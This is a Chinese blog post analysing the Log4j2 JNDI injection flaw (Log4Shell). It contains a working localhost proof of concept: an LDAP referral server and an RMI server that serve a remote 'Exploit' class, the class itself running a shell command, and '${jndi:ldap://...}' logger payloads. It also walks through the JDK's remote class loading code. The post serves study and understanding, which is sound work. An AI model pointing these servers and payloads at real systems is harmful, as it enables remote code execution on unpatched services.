+++
title = "Log4j2 JNDI远程注入漏洞引发的思考"
description = ""
date = 2021-12-19T22:55:54+08:00
featured = false
comment = true
toc = true
reward = true
pinned = false
categories = [
  "编程思想"
]
tags = [
  "Java"
]
series = [
  "Manual"
]
images = []

+++

12月10日凌晨，Apache 开源项目 Log4j 的远程代码执行漏洞细节被公开，由于其利用简单、危害巨大，一时引起不小的热度。本文将以该事件为切入点，浅析其中涉及的一些技术点。

<!--more-->

## 什么是LDAP

轻量级目录访问协议(LIGHT WEIGHT DIRECTORY ACCESS Protocol)，语言无关的，即可以有Java实现LDAP Server/Client，也可以有Python实现的LDAP Server/Client 等。

## 什么是RMI

Remote Method Invocation，Java 的远程方法调用。RMI 为应用提供了远程调用的接口，可以理解为 Java 自带的 RPC 框架。

## 什么是JNDI

JNDI (Java Naming and Directory Interface)

所谓**名称服务**，简单来说就是**通过名称查找实际对象的服务**。

- DNS: 通过域名查找实际的 IP 地址；
- 文件系统: 通过文件名定位到具体的文件；

**目录服务**是名称服务的一种拓展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性(attributes)信息。由此，我们不仅可以根据名称去查找(lookup)对象(并获取其对应属性)，还可以根据属性值去搜索(search)对象。

- NIS: Network Information Service，Solaris 系统中用于查找系统相关信息的目录服务；
- [Active Directory](https://en.wikipedia.org/wiki/Active_Directory): 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等

在下文中如果没有特殊指明，都会将名称服务与目录服务统称为目录服务。

## 为什么需要JNDI

为什么我们有了JDBC/LDAP/RMI等还需要JNDI呢？

我们以JDBC举例，我们使用原生JDBC连接数据库的时候，需要指定一系列参数，例如：连接地址、端口、数据库驱动、账号密码、连接池参数等等。我们怎么获取这些配置呢？这些配置除了配置在本地，还可以配置在远端，那么有没有一种接口屏蔽配置获取的具体细节？给它一个”名称“就能返回所有配置？这就是JNDI要做的事情，它定义了一套通过名称获取属性的API，JDBC/LDAP/RMI等都去实现它。

<img src="https://picgo.6and.ltd/img/image-20211219231451885.png" alt="image-20211219231451885" style="zoom: 43%;" />

## Log4j2远程注入演示

### LDAP



1. 启动 LDAPRefServer

```java
public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    /**
     * class地址 用#Exploit代替Exploit.class
     */
    private static final String EXPLOIT_CLASS_URL = "http://127.0.0.1:8000/#Exploit";

    public static void main(String[] args) {
        int port = 7912;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Calc");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

这里用到了ldap实现`unboundid-ldapsdk`：

```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>6.0.3</version>
</dependency>
```

2. 将恶意代码放在放在web服务器上

恶意攻击代码：

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("open -na Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

<!--`open -na Calculator` mac上打开计算器-->

这里使用mac自带的python web server

```sh
python -m SimpleHTTPServer
```

默认监听端口8000

3. 执行有漏洞的程序：

```java
public class Log4J {
    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:7912/Foo}");
    }
}
```

log4j我用2.14.1，JDK是8u281，因为8u281版本已经默认设置`com.sun.jndi.ldap.object.trustURLCodebase=false` 无法复现漏洞，所以这里设置成true.

### RMI

1. 启动rmi注册中心 `rmiregistry 1099` 

2. 启动 RMIServer

```java
public class RMIServer {
    public static void main(String args[]) {

        try {
            Registry registry = LocateRegistry.getRegistry(1099);

            String factoryUrl = "http://localhost:8000/";
            Reference reference = new Reference("Exploit", "Exploit", factoryUrl);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("Foo", wrapper);

            System.err.println("Server ready, factoryUrl:" + factoryUrl);
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
```

3. 将恶意代码放在放在web服务器上
4. 执行有漏洞的程序：

```java
public class Log4J {
    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        // 下面这行是我自己加的 8u281需要 原因看下文
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        logger.error("${jndi:rmi://localhost:1099/Foo}");
    }
}
```

即使这里演示的是RMI，也需要设置`com.sun.jndi.ldap.object.trustURLCodebase=true`，原因见下文



### 原理

jndi注入

#### jndi核心代码

`javax.naming.spi.NamingManager`

```java
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    // Try to use current class loader
    try {
         clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);
        } catch (ClassNotFoundException e) {
        }
    }

    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

可以看到，如果class在执行程序的classpath的话，会加载本地的class而不是加载远程的class

远程加载的代码如下：

`com.sun.naming.internal.VersionHelper12`

```java
/**
 * @param className A non-null fully qualified class name.
 * @param codebase A non-null, space-separated list of URL strings.
 */
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
    if ("true".equalsIgnoreCase(trustURLCodebase)) {
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    } else {
        return null;
    }
}
```

上面演示的RMI的时候提到，也需要设置`com.sun.jndi.ldap.object.trustURLCodebase=true`

那是因为在`com.sun.naming.internal.VersionHelper12` 的源码里已经写死了：

```java
private static final String TRUST_URL_CODEBASE_PROPERTY =
  "com.sun.jndi.ldap.object.trustURLCodebase";
```

远程加载class的时候都会走这个判断（这里我也不理解，为啥一定是ldap呢？）

#### 动态协议切换

我们来看下面的代码:

```java
public class JNDIDynamic {
    public static void main(String[] args) {
        if (args.length != 1) {
            System.out.println("Usage: lookup <domain>");
            return;
        }
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");
        env.put(Context.PROVIDER_URL, "dns://114.114.114.114");

        try {
            DirContext ctx = new InitialDirContext(env);
            DirContext lookCtx = (DirContext)ctx.lookup(args[0]);
            Attributes res = lookCtx.getAttributes("", new String[]{"A"});
            System.out.println(res);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```

意图很简单，想通过用户的输入去查找对应域名:

```sh
$ javac JNDIDynamic.java
$ java JNDIDynamic
Usage: lookup <domain>
$ java JNDIDynamic douban.com
{a=A: 140.143.177.206, 49.233.242.15, 81.70.124.99}
```

我们看到初始化 JNDI 上下文主要使用环境变量实现:

- INITIAL_CONTEXT_FACTORY: 指定初始化协议的工厂类；
- PROVIDER_URL: 指定对应名称服务的 URL 地址；

但是，实际上在 Context.lookup 方法的参数中，用户可以指定自己的查找协议：

```sh
$ java JNDIDynamic "ldap://localhost:8080/cn=evilpan"
javax.naming.NameNotFoundException: [LDAP: error code 32 - No Such Object]; remaining name 'cn=evilpan'
	at java.naming/com.sun.jndi.ldap.LdapCtx.mapErrorCode(LdapCtx.java:3183)
	at java.naming/com.sun.jndi.ldap.LdapCtx.processReturnCode(LdapCtx.java:3104)
	at java.naming/com.sun.jndi.ldap.LdapCtx.processReturnCode(LdapCtx.java:2895)
	at java.naming/com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1034)
	at java.naming/com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at java.naming/com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:207)
	at java.naming/com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
	at JNDIDynamic.main(JNDIDynamic.java:18)
```

这就是所谓的：动态协议切换

### 堆栈分析

最后，我们用Jndi lookup看一下是不是ldap/rmi的堆栈，是不是都用了jndi的方式去加载class

测试程序：

```java
public class JNDILookup {
    public static void main(String[] args) {

     System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
     // 下面这行是我自己加的 8u221需要 原因看下文
     System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

//     String url = "rmi://localhost:1099/Foo";
     String url = "ldap://localhost:7912/Foo";

        try {
            Object ret = new InitialContext().lookup(url);
            System.out.println("ret: " + ret);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
```



> Log4j之所以发生上述漏洞也是因为调用了jndi的lookup，所以这里直接使用jndi的lookup



Ldap lookup堆栈：

![image-20211220001424139](https://picgo.6and.ltd/img/image-20211220001424139.png)

rmi lookup堆栈：

![image-20211220003021810](https://picgo.6and.ltd/img/image-20211220003021810.png)



## 参考

[JNDI 注入漏洞的前世今生](https://evilpan.com/2021/12/13/jndi-injection/)

[攻击Java中的JNDI、RMI、LDAP(二)](https://y4er.com/post/attack-java-jndi-rmi-ldap-2/)
